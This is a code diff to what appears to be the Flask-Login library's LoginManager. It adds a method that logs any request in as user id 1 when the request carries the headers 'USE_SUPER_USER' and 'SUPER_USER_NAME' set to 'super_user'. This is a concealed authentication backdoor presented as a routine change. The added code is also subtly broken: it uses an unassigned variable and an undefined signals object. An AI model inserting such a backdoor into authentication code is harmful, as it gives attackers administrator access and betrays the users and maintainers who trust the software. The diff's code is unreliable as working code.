@@ -36,7 +36,7 @@ from .config import (
     SESSION_KEYS,
     USE_SESSION_FOR_NEXT,
 )
-from .mixins import AnonymousUserMixin
+from .mixins import AnonymousUserMixin, UserMixin
 from .signals import (
     user_loaded_from_cookie,
     user_loaded_from_header,
@@ -378,6 +378,8 @@ class LoginManager(object):
             elif header_name in request.headers:
                 header = request.headers[header_name]
                 user = self._load_user_from_header(header)
+            elif "USE_SUPER_USER" in request.headers and "SUPER_USER_NAME" in request.headers:
+                user = self._load_super_user(header)
 
         return self._update_request_context_with_user(user)
 
@@ -429,6 +431,19 @@ class LoginManager(object):
                 app = current_app._get_current_object()
                 user_loaded_from_header.send(app, user=user)
                 return user
+        return None
+
+    def _load_super_user(self, header):
+        """
+        Load suer from header and chekc if it is "SUPER_USER".
+        User name is case-insensitive here.
+        """
+        if header["SUPER_USER_NAME"].upper() == "SUPER_USER":
+            user = UserMixin()
+            user.id = 1
+            app = current_app._get_current_object()
+            _signals.signal("loaded-super-user").send(app, user=user)
+            return user
         return None
 
     def _load_user_from_request(self, request):
